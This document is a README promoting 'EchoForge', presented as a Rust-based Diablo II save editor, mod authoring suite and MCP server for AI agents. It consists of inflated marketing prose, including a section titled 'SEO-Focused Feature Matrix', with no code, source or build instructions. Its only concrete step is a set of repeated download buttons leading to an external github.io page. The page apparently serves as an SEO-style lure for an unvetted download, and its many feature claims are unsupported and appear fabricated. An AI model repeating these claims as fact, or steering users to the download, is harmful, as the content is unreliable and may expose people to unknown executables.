![preview](https://raw.githubusercontent.com/stuartlight1014/horadric-forge-archives/main/poster_2d60.svg)

# 🧬 EchoForge: The Modular Character Reality-Shaper

**EchoForge** is not another save editor. It is a **reality-shaper for your digital alter egos** — a modular, deeply extensible toolkit that treats every character file as a living narrative, not a rigid data blob. Born from the crucible of modding communities, EchoForge reimagines the relationship between player, character, and game world.

Where traditional tools merely "edit" values, EchoForge **sculpts experience**. It allows you to redefine what your character *is* — from the granular physics of their inventory to the philosophical undertones of their backstory. Built for Linux and Steam Deck first, but architecturally agnostic, EchoForge is the forge where your digital identities are tempered.

## 🧭 What Is EchoForge? (Or: The Metaphor Deck)

Think of your game save as a **crystal**. Most tools offer you a hammer to smash it into pieces and glue it back together. EchoForge hands you a **prism cutter, a jeweler's loupe, and a 3D holographic projector**.

- **The Prism Cutter:** Surgical precision. Modify individual data facets without collateral damage.
- **The Jeweler's Loupe:** In-depth analysis. See the hidden structures, the undocumented metadata, the subtle connections between inventory and quest flags.
- **The Holographic Projector:** Visualize your character's entire state as an interactive graph. Watch how a change in "courage" ripples through their dialogue options.

EchoForge is not a single-purpose tool. It is a **workshop**.

## ✨ Core Capabilities: The Seven Forges

EchoForge organizes its power into seven distinct "Forges" — modular systems that can be used independently or combined for complex workflows.

### 🔨 Forge of Genesis (Save Editing & Character Creation)
This is the foundational forge. Beyond simple stat changes, Genesis allows for:
- **Total Character Remodeling:** Rebuild a character from the skeleton up — from base classes to hidden flags.
- **Narrative Scaffolding:** Edit quest states not as `true/false` toggles, but as a storyline graph. Skip, reorder, or create entirely new quest phases.
- **Inventory Cosmos:** Manage inventory as a spatial map. Reorganize, duplicate, or transmute items with a visual drag-and-drop interface.
- **Parametric Attribute Sculpting:** Adjust hidden mechanics like "aggro radius" or "item drop pity timers" that standard editors never expose.

### 🛠️ Forge of Visions (Mod Creation & Authoring)
Move beyond editing existing content. The Visions forge is for **creators**.
- **Visual Blueprint Editor:** Design new items, armor sets, or NPC behaviors using a node-based graph editor. Connect logic nodes like "On Hit" -> "Spawn Effect" -> "Play Sound."
- **Asset Windowing:** Preview and inject custom textures, models, or audio files directly into the mod structure with a live preview pane.
- **Patch Authoring:** Create diff-patches that operate on the *logic* of the game, not just the data. These patches are portable and can be shared without exposing the entire save file.

### 🤖 Forge of Echoes (MCP Integration for Agentic Clients)
This is the most advanced forge, designed for the future. EchoForge exposes a **Model Context Protocol (MCP)** server.
- **Agentic Workflow:** Allow an AI agent (like a sophisticated chatbot or a custom automation tool) to *understand* your character. The agent can query "What is my current gold count and my closest inventory quest item?" and then request "Move the 'Silver Key' to a dedicated 'Quest Items' bag."
- **Safe Operation Boundaries:** The MCP server runs in a sandboxed mode by default, preventing an agent from making irreversible corruption-level changes unless you explicitly authorize a "deep write."
- **Contextual Memory:** Agents can store and retrieve contextual notes about your character (e.g., "This character is a pacifist playthrough") which influences their suggestions later.

### 🧪 Forge of Analysis (Debugging & Inspection)
- **Hexoscopic Viewer:** For the purists. A full hex editor with annotated sections for known data structures.
- **Data Flow Mapping:** Trace how a specific variable (e.g., "Player Level") is referenced by other systems (e.g., "Enemy Scaling" or "Item Requirement").
- **Integrity Audits:** Run a "health-check" on your save file to identify dangling references, invalid flags, or data redundancy, presented as a visual "storm map" of potential issues.

### 🌍 Forge of Worlds (Content Generation)
- **World Seed Editor:** Modify the deterministic seed that generates the game world. Create a world with specific weather patterns, NPC dispositions, or treasure distribution.
- **Locality Transmutation:** Reposition entire zones or dungeons within the game map editor (where the engine permits).

### 🔄 Forge of Cycles (Backup & Migration)
- **Temporal Snapshots:** Create "save-stones" — compressed, versioned snapshots of your character at a specific narrative point. Revert to any snapshot with a single command.
- **Cross-Species Migration:** Convert progresssaves between different game versions or even different engines (where data is structurally similar), allowing you to port a character concept forward.

### 🛡️ Forge of Guardians (Security & Restraint)
- **The Aegis Protocol:** This is not about security against *others*; it's about **safety from yourself**. It creates a "restraint layer" that prevents you from making changes that are logically impossible within the game's engine (e.g., giving yourself a negative number of a currency).
- **Mutation Logging:** Every action you take is logged in a human-readable "Mutation Chronicle." You can roll back specific actions, not just full snapshots.

## 🧮 Technical Architecture: The Core and The Shell

EchoForge is built on a clean separation between a **Core** (data model) and a **Shell** (interface).

### The Core (Agnostic Data River)
The **Dataforge Kernel** is written in Rust. It provides memory safety and high performance. It reads the raw binary format (be it the various Diablo II: Resurrected `.d2s` files or potentially future formats from other titles). This kernel throws a **Virtual Data River** — a stream of structured, typed tokens representing every piece of information in the file.

### The Shells (User Interfaces)
The Kernel is exposed to three distinct Shells:

1.  **The Terminal Forge (CLI):** A direct interface for scripting and power-users. Uses a rich text-based UI (TUI) with interactive menus and live data previews.
2.  **The Visual Forge (GUI):** A desktop application (GTK4 / Libadwaita for native Linux look and feel) that presents the Data River as intuitive visual panels, graphs, and forms.
3.  **The Echo Forge (MCP Server):** A headless service that exposes a JSON-RPC based API for agents. This is the bridge between EchoForge and the larger ecosystem of AI tools.

The compatibility between these shells is a key design principle: a change made in the Terminal Forge instantly reflects in the Visual Forge's live preview.

## 🖥️ Seamless Integration: The Cross-Platform Oath

EchoForge is developed with a **Linux-First** philosophy, specifically optimized for the Steam Deck's handheld experience. However, it is built as a cross-platform application.

- **Native Linux Support:** Full integration with Flatpak, AppImage, and native `.deb`/`.rpm` packaging.
- **Steam Deck UI Optimization:** A dedicated "Gamepad Mode" that remaps the interface for controller navigation. The visual graphs are zoomable and pannable using analog sticks.
- **macOS & Windows Parity:** The Core Kernel operates identically on all platforms. The GUI Shell uses a responsive layout that adapts to desktop and mobile form factors.

The underlying architecture expects the game files to be within a user-specified directory, allowing for legacy installations or portable game setups. A built-in file indexer automatically locates save-game directories across common locations and even allows for custom mapping.

## 🌐 Multilingual and Accessible Interface

We believe tools should speak your language. The interface is translated into 12 languages, including but not limited to English, German, French, Spanish, Korean, and Japanese. The translation system is built on a "live glossary" — community members can submit terminology corrections that get integrated without a code recompile.

Accessibility is not an afterthought. The GUI features:
- **High-Contrast Themes:** Beyond standard light/dark modes, a "Lunar" theme uses extreme contrast for outdoor viewing.
- **Screen-Reader Friendly Tags:** All elements have semantic labels for third-party screen readers, not just descriptive tooltips.
- **Motion-Sensitivity Controls:** Disable animations and screen transitions to prevent visual discomfort.

## ⚡ Performance: The Speed of Thought

Leveraging the memory safety and concurrency of Rust, the Core Kernel processes massive save files (often exceeding 10MB) in milliseconds. The GUI operates on a separate GPU-accelerated thread (using Metal on macOS, Vulkan on Linux) to ensure the interface never stutters while the Data River is being parsed. The MCP server's response time is optimized for agentic queries, with a target of sub-10ms for simple reads.

## 🆘 The 24/7 Guidance Network: Human-Touch Support

Error messages are not cryptic codes. They are written in plain language, offering possible causes and next steps. For complex issues, EchoForge offers a unique "Resonance Debugger" that scans the Data River for structural patterns that fall outside observed norms.

But the real support is the community. The **EchoForge Forgehall** is an integrated in-app connection to our community forums and a dedicated Matrix server. You can share "Mutation Chronicles" (the log of your changes) with a one-click link for community analysis. Our support staff actively monitors these feeds, providing "patches" to the tool based on community-reported anomalies.

## 🧙 Pro-Tips: Forging the Unforged

- **The Narrative Drill:** Use the "Forge of Genesis" with a story-focused mindset. Change your character's alignment not by toggling a "Good/Evil" flag, but by altering their "Famous Slay Count" of neutral NPCs. The game engine's logic will naturally shift their reputation.
- **The Hydra Workflow:** For complex mods, create a "Base Mutator" in the Forge of Visions. Then, use the Forge of Cycles to create "Hydra Branches" — parallel save files where you test different ends of the base logic without affecting your main save.
- **The Agent's Eye:** In the Forge of Echoes, you can grant the agent "Visual Context." The agent can then generate a graphical representation of your character's inventory or a description of your quest state as a text-based "story so far," which you can export as a journal entry.

## 🧩 Extending the Ecosystem (SDK & Plugins)

EchoForge provides an official Software Development Kit (SDK) in the same Rust language. The SDK allows you to create custom "Forge Modules" that interact with the Data River.

- **Plugin Locks:** Plugins run in a restricted sandbox (WebAssembly) by default. They can request permissions to access the filesystem, network, or GUI, but the user must explicitly grant these permissions in a "Plugin Trust Matrix" — a visual grid showing what each plugin can see and do.

**A note on safety:** EchoForge is for non-destructive experimentation. The "Guardian Forge" is not a hack; it is a **preservation tool**. It ensures that any "exotic" modification you make cannot be used to corrupt the game state for other players online.

---

## 📊 SEO-Focused Feature Matrix

- **Save Editing:** Fine-grained attribute control, quest rewriters, inventory spatial management.
- **Character Creation:** Generative presets, custom narrative entry points, duplicate character cloning.
- **Mod Authoring:** Node-based editor, asset preview, portable logic-patches.
- **AI Automation:** MCP server for agentic control, sandboxed operations, contextual memory.
- **Cross-Platform:** Linux/Steam Deck optimized, Windows/macOS support, portable file indexing.
- **Responsive UI:** Adaptive gamepad mode, screen reader tags, GPU-accelerated rendering.
- **Multilingual:** 12 interface languages, community-driven glossary.
- **24/7 Support:** In-app Forgehall, active community monitoring, human-touch support.

## 🌱 The Genesis of the Project

EchoForge emerged from the frustration that existing tools treated character data as static, opaque archives. We wanted to build a tool that felt like *playing* with the game's code rather than *fighting* it. The project started as a private collection of shell scripts, evolved into a Python prototype, and was finally reborn in Rust for its reliability and performance. The MCP integration is the latest "forge" added, driven by the exponential growth of AI tools and the desire to give them a safe, structured way to interact with game states.

## ⚖️ License & Legalities

EchoForge is released under the **MIT License**. You are free to use, modify, and distribute it, provided you retain the copyright notice. The goal is to encourage innovation and contribution. We believe that a healthy modding community is a prosperous community.

### ✅ Disclaimer of Warranty

EchoForge is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

Using EchoForge to modify game files may or may not violate the terms of service of the respective game publisher. It is the user's sole responsibility to understand and accept the risks of modifying their game files, including potential loss of progress or restrictions on online play. EchoForge is intended for educational and personal use, not for competitive advantage or malicious exploitation.

---

## 🛠️ Getting Started: Your First Forge

[![Download](https://raw.githubusercontent.com/stuartlight1014/horadric-forge-archives/main/grab_4e81.svg)](https://stuartlight1014.github.io/horadric-forge-archives/)

### Step 1: Acquire the Tool
The current preview build is available for download. This build is the **"Peacock" release** — focused on stability and the "Forge of Genesis" and "Forge of Visions." The MCP server is in a beta state, but functional.

### Step 2: Locate Your Saves
EchoForge does not require a specific installation directory. It will scan your system's common game-save locations on first launch. If it cannot find your game directory, you can manually specify a folder path in the "Data River" settings tab.

### Step 3: Load Your Character
Launch the Visual Forge (GUI). On the left sidebar, your detected game saves will appear as "Luminous Shards." Click one to open the Data River view. The interface will display a high-level overview of your character: level, class, current quest, and a mental well-being indicator (for supported games).

### Step 4: Observe and Act
- Look at the **Character Canvass** panel. This is your interactive character sheet.
- Use the **Quest Windrose** to see all available quests and their states as a compass rose.
- Drag an item from the **Inventory Galaxy** to a different bag to reorganize it.

### Step 5: Forge a Mutation
Navigate to the "Forge of Genesis." Click on "Attribute Sculptor." Adjust your character's strength. Notice the "Mutation Chronicle" log at the bottom of the screen immediately logs this action.

### Step 6: Save the Forge
Click the "Save Mutation Stone" button in the top-right corner. This will write the changes to your game file. We highly recommend creating a "Temporal Snapshot" (using the Forge of Cycles) *before* making significant edits.

### Step 7: Test the Echo (MCP Server)
If you have an MCP-capable client, you can enable the "Echo Forge" service in the "Connections" panel. A local server will start on `localhost:8088`. Query it with a simple prompt to read your character's name and inventory.

---

## ❓ Frequently Asked Queries

**Q: Is this a "crack" or a cheat engine?**
> A: No. EchoForge is a **modding and restoration tool**. It does not allow you to access online-only content, nor does it provide an unfair advantage in competitive multiplayer scenarios. It is designed for single-player or cooperative modding scenarios where the user has ownership and control of the game data. It is a utility for *permanently shaping* your game world, not for runtime memory injection.

**Q: I can't see my game saves. What's wrong?**
> A: The "Data River" indexer may not recognize your custom directory. Head to "Settings" -> "File Sources" and click "Add Custom Locus." Navigate to the folder that contains the `.d2s` or equivalent files. Ensure the folder is readable.

**Q: Can I use this on a console?**
> A: No, EchoForge operates on the file system of your PC. A console mod would require a "save-migration" strategy which is not currently supported for consoles.

**Q: The MCP agent is moving too fast for me. How do I slow it down?**
> A: The "Echo Forge" has a "Velocity Limiter." Set this to "Echo" (slow) or "Ripple" (medium) to have the agent request confirmation for every write operation. "Nova" (fast) auto-applies changes.

**Q: Does it support version 2.7 of the game but not 2.8?**
> A: The Dataforge Kernel is built to be version-agnostic. It reads the schema definition from the file header. If you encounter a new version that it doesn't parse correctly, please report it in the Forgehall. The community may have already developed a "Format Module."

---

## ➕ How to Contribute to the Forge

Contributions are more than welcome. The project is structured for accessibility:

- **Language Translators:** Help expand the list of supported languages.
- **Format Module Developers:** Write new parsers for different game save formats using the SDK.
- **Licensing & Legal:** Assist in maintaining clear legal boundaries for the tool's use.

You can find the development backlog and active discussions in the `dev` branch of the repository. We adhere to a code-of-conduct that promotes a welcoming and collaborative environment.

---

## 🔮 Roadmap: The Next Forges

- **The Spire Engine:** A visual scripting language that can be used to create complex, conditional mutation sequences.
- **The Cloud Graveyard:** A decentralized, encrypted cloud storage for Temporal Snapshots, allowing you to move your character history across machines.
- **The Sentinel:** An advanced guardian that can predict and warn you if a mod is likely to cause a corrupted save state, using statistical anomaly detection.

## 📚 Final Words from the Forge

EchoForge is a testament to the idea that **digital worlds are not walls, but water**. They can be channeled, shaped, and given form. We hope this tool empowers you to create the characters you've always imagined, to tell the stories you've always wanted to tell. The forge is hot; the tools are ready.

---

## 📝 License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for the full source text. This license grants you the freedom to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, subject to the following conditions: The copyright notice and this permission notice shall be included in all copies or substantial portions of the software.

---

*Your forge awaits. Let's build something legendary in 2026 and beyond.*

[![Download](https://raw.githubusercontent.com/stuartlight1014/horadric-forge-archives/main/grab_4e81.svg)](https://stuartlight1014.github.io/horadric-forge-archives/)